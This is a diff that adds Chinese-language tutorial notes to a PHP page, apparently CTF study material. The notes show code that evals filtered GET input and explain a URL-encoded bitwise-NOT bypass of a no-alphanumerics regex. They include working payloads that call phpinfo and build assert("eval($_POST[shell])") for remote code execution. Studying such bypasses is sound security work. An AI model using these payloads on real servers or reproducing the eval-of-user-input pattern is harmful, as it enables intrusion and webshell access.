@@ -184,6 +184,41 @@ $img = "<img src=\"".$filename."\"/>";
 echo $img; 
 ?>
 
+<p>URL编码取反？</p>
+<p>例如：</p>
+<?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(strlen($code)>40){
+        die("This is too Long.");
+    }
+    if(preg_match("/[A-Za-z0-9]+/",$code)){
+        die("NO.");
+    }
+    @eval($code);
+}
+else{
+    highlight_file(__FILE__);
+}
+
+如果要绕过正则RCE，我们可以采用url取反绕过，如
+
+?code=(~%8F%97%8F%96%91%99%90)();
+# %8F%97%8F%96%91%99%90 : phpinfo
+这里还利用了一点是：对于PHP，形如 (func_name)()，其中func_name可以是字符串，会执行这个func
+
+当 (~%8F%97%8F%96%91%99%90%D7%D6);被当作代码执行时的第一步就是取反操作 ~
+但是取反得到的字符串 phpinfo()并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 phpinfo()
+
+对于已知过滤条件，想要执行我们指定的代码，必须有 (func_name)()这样的形式
+
+执行过程：
+
+第一层eval：首先 (~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6); 先会执行取反函数，得到 ("assert")("eval($_POST[shell])")
+第二层assert：将字符串 "eval($_POST[shell])" 看作php代码执行
+第三层eval：将 $_POST[shell] 传来的数据看作代码执行
+
 
     </div>
 
